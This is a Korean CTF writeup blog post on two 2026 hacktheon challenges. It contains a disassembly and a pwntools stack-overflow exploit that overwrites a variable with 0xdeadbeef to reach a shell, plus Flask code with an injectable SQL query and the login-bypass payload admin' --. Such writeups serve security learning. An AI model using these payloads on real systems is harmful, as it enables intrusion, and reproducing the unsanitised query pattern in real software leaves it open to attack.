---
title: "2026 hacktheon Writeup"
date: 2026-04-27 14:30:00 +0900
categories: [CTF / Wargame]
tags: [hacktheon, CTF]
---

# 2026 hacktheon에 참여하여 풀었던 문제 Writeup이다.

## Pwn - Immutable

```
pwndbg> disas
Dump of assembler code for function main:
   0x00005555555551e9 <+0>:	endbr64
   0x00005555555551ed <+4>:	push   rbp
   0x00005555555551ee <+5>:	mov    rbp,rsp
=> 0x00005555555551f1 <+8>:	sub    rsp,0x90
   0x00005555555551f8 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000555555555201 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555205 <+28>:	xor    eax,eax
   0x0000555555555207 <+30>:	mov    rax,QWORD PTR [rip+0x2e12]        # 0x555555558020 <stdin@GLIBC_2.2.5>
   0x000055555555520e <+37>:	mov    ecx,0x0
   0x0000555555555213 <+42>:	mov    edx,0x2
   0x0000555555555218 <+47>:	mov    esi,0x0
   0x000055555555521d <+52>:	mov    rdi,rax
   0x0000555555555220 <+55>:	call   0x5555555550e0 <setvbuf@plt>
   0x0000555555555225 <+60>:	mov    rax,QWORD PTR [rip+0x2de4]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x000055555555522c <+67>:	mov    ecx,0x0
   0x0000555555555231 <+72>:	mov    edx,0x2
   0x0000555555555236 <+77>:	mov    esi,0x0
   0x000055555555523b <+82>:	mov    rdi,rax
   0x000055555555523e <+85>:	call   0x5555555550e0 <setvbuf@plt>
   0x0000555555555243 <+90>:	lea    rax,[rip+0xdba]        # 0x555555556004
   0x000055555555524a <+97>:	mov    rdi,rax
   0x000055555555524d <+100>:	mov    eax,0x0
   0x0000555555555252 <+105>:	call   0x5555555550d0 <printf@plt>
   0x0000555555555257 <+110>:	lea    rax,[rbp-0x90]
   0x000055555555525e <+117>:	mov    rsi,rax
   0x0000555555555261 <+120>:	lea    rax,[rip+0xdae]        # 0x555555556016
   0x0000555555555268 <+127>:	mov    rdi,rax
   0x000055555555526b <+130>:	mov    eax,0x0
   0x0000555555555270 <+135>:	call   0x5555555550f0 <__isoc99_scanf@plt>
   0x0000555555555275 <+140>:	mov    eax,DWORD PTR [rbp-0x10]
   0x0000555555555278 <+143>:	cmp    eax,0xdeadbeef
   0x000055555555527d <+148>:	jne    0x55555555529f <main+182>
   0x000055555555527f <+150>:	lea    rax,[rip+0xd93]        # 0x555555556019
   0x0000555555555286 <+157>:	mov    rdi,rax
   0x0000555555555289 <+160>:	call   0x5555555550a0 <puts@plt>
   0x000055555555528e <+165>:	lea    rax,[rip+0xd8d]        # 0x555555556022
   0x0000555555555295 <+172>:	mov    rdi,rax
   0x0000555555555298 <+175>:	call   0x5555555550c0 <system@plt>
   0x000055555555529d <+180>:	jmp    0x5555555552ae <main+197>
   0x000055555555529f <+182>:	lea    rax,[rip+0xd84]        # 0x55555555602a
   0x00005555555552a6 <+189>:	mov    rdi,rax
   0x00005555555552a9 <+192>:	call   0x5555555550a0 <puts@plt>
   0x00005555555552ae <+197>:	mov    eax,0x0
   0x00005555555552b3 <+202>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00005555555552b7 <+206>:	sub    rdx,QWORD PTR fs:0x28
   0x00005555555552c0 <+215>:	je     0x5555555552c7 <main+222>
   0x00005555555552c2 <+217>:	call   0x5555555550b0 <__stack_chk_fail@plt>
   0x00005555555552c7 <+222>:	leave
   0x00005555555552c8 <+223>:	ret
```
위는 main에서 멈춘 뒤 disas를 한 결과이다.

이를 분석하면 로컬 변수를 위해 144바이트 공간 할당 <br>
스택 카나리가 [rpb - 0x8]위치에 보안을 위한 카나리 값을 삽입하게 함 <br>
scanf를 호출하여 입력을 [rbp - 0x90]에 저장<br>
[rbp - 10]에 저장된 값과 0xdeadbeef와 비교<br>
일치하면 셸을 실행하는 것을 알 수 있다.<br>

```
from pwn import *

HOST = '3.37.**.**'
PORT = 33***

p = remote(HOST, PORT)

payload = b"A" * 128
payload += p32(0xdeadbeef)

p.sendline(payload)

p.interactive()
```
이에 맞게 작성한 익스플로잇이다. 이를 실행하면 flag를 획득할 수 있다.

---

## Web - simple-sqli

```
@app.route("/", methods=["GET", "POST"])
def index():
    init_db()
    message = ""
    status = "idle"

    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        query = (
            "SELECT username, role, secret FROM users "
            f"WHERE username = '{username}' AND password = '{password}'"
        )

        try:
            user = run_query(query)

```

사용자 입력값 검사 로직이 없음

admin' --을 {username}에 입력하여 flag 획득할 수 있다.
